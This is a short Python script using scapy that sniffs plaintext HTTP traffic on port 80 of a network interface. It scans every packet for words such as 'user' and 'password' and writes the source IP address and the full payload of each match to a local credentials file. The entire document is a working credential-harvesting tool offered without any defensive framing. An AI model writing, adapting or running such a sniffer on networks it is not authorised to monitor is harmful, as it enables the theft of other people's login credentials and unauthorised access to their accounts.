from scapy.all import sniff, IP, Raw, TCP_SERVICES

keywords = ["user", "username", "pass", "password"]

def process_packet(packet):

    if packet.haslayer(Raw):
        payload = str(packet[Raw].load)
        for word in keywords:
            if word in payload.lower():

                output = f"\nSensitive Data Found: {packet[IP].src}  --> {payload}"
                with open("cred_data.txt", 'a') as f:
                    f.write(output)
                break

print("MOnitoring on password (try to loging into http site)")
sniff(iface='eth0', filter='tcp port 80', prn=process_packet, store=0)